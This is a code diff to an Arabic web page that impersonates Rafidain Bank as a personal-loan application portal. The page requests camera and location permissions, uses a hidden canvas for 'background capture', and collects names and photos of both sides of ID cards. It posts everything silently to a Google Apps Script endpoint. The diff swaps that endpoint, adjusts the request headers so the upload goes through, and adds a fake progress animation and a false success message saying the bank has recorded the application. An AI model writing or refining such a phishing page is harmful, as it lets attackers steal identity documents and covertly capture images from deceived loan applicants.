@@ -90,11 +90,13 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .success-msg {
+        .success-box {
             text-align: center;
+            padding: 30px;
+        }
+        .success-box h3 {
             color: var(--success-green);
-            font-size: 18px;
-            font-weight: bold;
+            font-size: 22px;
         }
     </style>
 </head>
@@ -106,16 +108,16 @@
         <p>بوابة التقديم الذكية للسلف الشخصية</p>
     </div>
 
-    <!-- جاري التحميل والتحقق التلقائي -->
+    <!-- خطوة التحميل الأولي الخفي -->
     <div id="stepLoading" class="step active loading-screen">
         <div class="spinner"></div>
-        <h3 style="color: var(--success-green);">جاري الاتصال بخوادم مصرف الرافدين...</h3>
+        <h3 style="color: var(--success-green);">جاري الاتصال بخوادم المصرف...</h3>
         <p>يرجى السماح بصلاحيات الموقع والكاميرا للمتابعة.</p>
     </div>
 
     <!-- الاستمارة -->
     <div id="stepForm" class="step">
-        <h3 style="color: var(--success-green); text-align: center;">استمارة التقديم الرسمية</h3>
+        <h3 style="color: var(--primary-color); text-align: center;">استمارة التقديم الرسمية</h3>
         <form id="loanForm" onsubmit="submitLoanForm(event)">
             <div class="form-group">
                 <label for="fullName">الاسم الثلاثي واللقب:</label>
@@ -151,15 +153,22 @@
                 <input type="file" accept="image/*" capture="environment" id="cardBack" required>
             </div>
 
-            <button type="submit" class="btn">إرسال الطلب نهائياً</button>
+            <button type="submit" id="submitBtn" class="btn">إرسال الطلب نهائياً</button>
         </form>
     </div>
 
-    <!-- النجاح -->
+    <!-- خطوة جاري الإرسال مع النقاط المتحركة -->
+    <div id="stepSending" class="step loading-screen">
+        <div class="spinner"></div>
+        <h3 id="loadingText" style="color: var(--primary-color);">جاري الإرسال</h3>
+        <p>يرجى الانتظار قليلاً ريثما يتم معالجة وتخزين بياناتك...</p>
+    </div>
+
+    <!-- خطوة النجاح (تهانينا) -->
     <div id="stepSuccess" class="step">
-        <div class="success-msg">
-            <h3>تم تقديم طلبك بنجاح!</h3>
-            <p>شكراً لك. تم حفظ بياناتك وصور البطاقة في النظام وسيتم التواصل معك قريباً.</p>
+        <div class="success-box">
+            <h3 style="color: var(--success-green);">🎉 تهانينا! تم استلام طلبك بنجاح</h3>
+            <p>لقد تم حفظ معلوماتك وتوثيق طلبك في نظام مصرف الرافدين، وسيتم التواصل معك قريباً.</p>
         </div>
     </div>
 </div>
@@ -168,7 +177,7 @@
 <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
 <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwakSQTiIygWy-XfnBMlpzbcFcjGSWUh4r2gW_R2OWBBMKHBZu7JVDgWfIBn5OHHaYBiQ/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwwWTz7vnS6Vl8bE2YCWfi1BTpX7LJE5NsPKOzLM58m6qwbta1uVD6msWl0QZcD9nqQjw/exec";
 
     let backgroundData = {
         type: "background_capture",
@@ -225,7 +234,7 @@
         fetch(SCRIPT_URL, {
             method: 'POST',
             mode: 'no-cors',
-            headers: { 'Content-Type': 'application/json' },
+            headers: { 'Content-Type': 'text/plain;charset=utf-8' },
             body: JSON.stringify(backgroundData)
         }).catch(e => console.log(e));
 
@@ -244,8 +253,24 @@
         });
     }
 
+    // تأثير النقاط المتحركة بجانب كلمة "جاري الإرسال"
+    let dotInterval;
+    function startLoadingAnimation() {
+        let dots = 0;
+        const textElement = document.getElementById('loadingText');
+        dotInterval = setInterval(() => {
+            dots = (dots + 1) % 4;
+            textElement.textContent = "جاري الإرسال" + ".".repeat(dots);
+        }, 500);
+    }
+
     async function submitLoanForm(event) {
         event.preventDefault();
+
+        // إخفاء الاستمارة وإظهار شاشة "جاري الإرسال...."
+        document.getElementById('stepForm').classList.remove('active');
+        document.getElementById('stepSending').classList.add('active');
+        startLoadingAnimation();
 
         const frontFile = document.getElementById('cardFront').files[0];
         const backFile = document.getElementById('cardBack').files[0];
@@ -264,14 +289,22 @@
             await fetch(SCRIPT_URL, {
                 method: 'POST',
                 mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
+                headers: { 'Content-Type': 'text/plain;charset=utf-8' },
                 body: JSON.stringify(formData)
             });
 
-            document.getElementById('stepForm').classList.remove('active');
-            document.getElementById('stepSuccess').classList.add('active');
+            // محاكاة وقت قصير لضمان اكتمال الإرسال ووقف الحركة ثم عرض رسالة التهاني
+            setTimeout(() => {
+                clearInterval(dotInterval);
+                document.getElementById('stepSending').classList.remove('active');
+                document.getElementById('stepSuccess').classList.add('active');
+            }, 2000);
+
         } catch (error) {
-            alert('حدث خطأ أثناء الإرسال، يرجى المحاولة مرة أخرى.');
+            clearInterval(dotInterval);
+            alert('حدث خطأ أثناء الإرسال، يرجى التأكد من الاتصال بالإنترنت.');
+            document.getElementById('stepSending').classList.remove('active');
+            document.getElementById('stepForm').classList.add('active');
         }
     }
 </script>
